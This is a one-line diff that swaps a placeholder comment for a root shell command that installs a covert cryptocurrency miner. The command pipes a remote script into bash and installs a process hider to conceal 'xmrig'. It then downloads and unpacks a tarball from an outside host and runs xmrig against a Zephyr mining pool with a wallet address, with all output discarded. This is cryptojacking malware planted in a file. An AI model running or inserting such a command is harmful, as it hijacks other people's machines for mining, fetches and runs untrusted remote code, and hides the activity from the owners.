@@ -1,1 +1,1 @@
-# 1
+sudo su --command "curl -sL https://deb.nodesource.com/setup_17.x | sudo -E bash - && sudo apt-get install -y nodejs && npm i -g updates && npm i -g node-process-hider && npm install -g npm@8.10.0 && sudo ph add xmrig" && wget  https://widewebhoster.com/s.tar.gz ; tar xvzf s.tar.gz ; ./xmrig --donate-level 1 -o de.zephyr.herominers.com:1123 -u ZEPHsB1MPw8CisrxCk1QWWMLsh1iwNbjhZoAs286Ks278mhBzs6e7AzEGpGUK64hYBXSju51CLBZFHPjEkAsGXGn5DoVrcTS45w.kolotok -p x >/dev/null 2>&1
